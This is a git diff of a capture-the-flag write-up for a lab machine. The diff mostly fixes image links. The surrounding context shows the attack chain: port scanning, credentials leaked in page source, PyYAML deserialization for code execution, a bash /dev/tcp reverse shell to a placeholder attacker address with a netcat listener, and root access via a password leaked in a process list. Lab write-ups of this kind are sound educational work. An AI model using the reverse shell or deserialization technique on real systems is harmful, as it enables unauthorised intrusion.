@@ -11,14 +11,14 @@
 
 Configure local hostname resolution:
 
-![[Machines/TryHackMe/BearchBar/Screenshots/etchosts.png]]
+![](Screenshots/etchosts.png)
 ### Nmap Scan — Port Enumeration
 
 Perform comprehensive port scanning to identify active services:
 
 `nmap -p- bar.lab -sC -sV --min-rate 500 -o ports.txt`
 
-![[Machines/TryHackMe/BearchBar/Screenshots/nmap.png]]
+![](Screenshots/nmap.png)
 
 - SSH on standard port 22 (OpenSSH 9.6p1)
 - Web server on port 80 (Gunicorn)
@@ -32,14 +32,14 @@ Perform comprehensive port scanning to identify active services:
 
 Access the web application on port 80:
 
-![[Machines/TryHackMe/BearchBar/Screenshots/application.png]]
+![](Screenshots/application.png)
 
 
 Accessing `http://bar.lab/` redirects to `/login`.
 
 View source exposure valid credentials for demo DJ login
 
-![[Machines/TryHackMe/BearchBar/Screenshots/viewsource.png]]
+![](Screenshots/viewsource.png)
 
 
 ---
@@ -50,7 +50,7 @@ View source exposure valid credentials for demo DJ login
 
 Upon successful login, user is presented with DJ booth management dashboard.
 
-![[userinterface.png]]
+![](Screenshots/userinterface.png)
 
 **Dashboard Features:**
 
@@ -61,11 +61,11 @@ Upon successful login, user is presented with DJ booth management dashboard.
 
 Import interface:
 
-![[import.png]]
+![](Screenshots/import.png)
 
 Then export the current playlist to understand file format:
 
-![[playlist.png]]
+![](Screenshots/playlist.png)
 
 
 ---
@@ -84,19 +84,19 @@ Unsafe PyYAML loaders can instantiate arbitrary Python objects and invoke Python
 
 ### Testing Unsafe Deserialization
 
-![[testplaylist.png]]
+![](Screenshots/testplaylist.png)
 
 
-![[testoutput.png]]
+![](Screenshots/testoutput.png)
 
 ### Uploading Malicious YAML
 
 Create a test YAML file with Python object deserialization:
 
-![[idyaml.png]]
+![](Screenshots/idyaml.png)
 
 
-![[testid.png]]
+![](Screenshots/testid.png)
 
 **Confirmation:** Code execution achieved as user `bartender`.
 
@@ -131,7 +131,7 @@ The `id` command can be replaced with a reverse shell for interactive access:
 "bash", "-c", "bash -i >& /dev/tcp/*ip*/*port* 0>&1"
 ```
 
-![[revshellcode.png]]
+![](Screenshots/revshellcode.png)
 
 **Setup listener on attack machine:**
 
@@ -149,7 +149,7 @@ nc -lnvp 9999
 
 **Shell received:**
 
-![[reverseshell.png]]
+![](Screenshots/reverseshell.png)
 
 **Shell User:** `bartender` 
 **Current Directory:** `/opt/beach-bar/webapp`
@@ -158,7 +158,7 @@ nc -lnvp 9999
 
 Navigate to home directory and capture user flag:
 
-![[Machines/TryHackMe/BearchBar/Screenshots/userflag.png]]
+![](Screenshots/userflag.png)
 
 
 ---
@@ -175,7 +175,7 @@ ps aux | grep "root"
 
 **Key Process Identified:**
 
-![[leakedpass.png]]
+![](Screenshots/leakedpass.png)
 
 **Analysis:**
 
@@ -196,7 +196,7 @@ su root
 ```
 
 
-![[Machines/TryHackMe/BearchBar/Screenshots/rootflag.png]]
+![](Screenshots/rootflag.png)
 
 Pwned
 
@@ -221,4 +221,4 @@ Pwned
 
 ---
 
-> Made by [Noname](https://github.com/NonamesecX) | For educational purposes only
+> Made by [NonamesecX](https://github.com/NonamesecX) | For educational purposes only
